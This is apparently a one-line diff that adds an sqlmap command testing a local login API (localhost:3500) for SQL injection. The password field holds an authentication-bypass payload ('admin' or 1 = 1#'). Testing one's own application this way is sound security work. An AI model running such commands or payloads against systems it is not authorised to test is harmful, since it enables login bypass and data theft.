@@ -1,0 +1,1 @@
+python sqlmap.py -u http://localhost:3500/api/v1/customers/login --data="username=test&password=admin' or 1  =  1#" -p password
